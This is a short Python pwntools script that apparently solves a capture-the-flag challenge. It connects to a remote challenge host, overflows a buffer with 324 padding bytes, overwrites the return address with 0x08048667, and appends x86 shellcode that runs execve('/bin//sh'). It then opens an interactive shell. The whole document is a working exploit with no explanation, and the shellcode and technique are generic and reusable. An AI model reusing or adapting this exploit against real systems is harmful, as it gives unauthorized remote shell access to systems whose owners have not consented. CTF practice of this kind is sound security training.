from pwn import *
sh = remote('challenge.acictf.com', 31813)
#sh = process('./server')
payload = "HELLO"
payload += "a"*324
payload += p32(0x08048667)
payload += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc2\x89\xc1\xb0\x0b\xcd\x80"
payload += "\x00"
sh.sendline(payload)
sh.interactive()
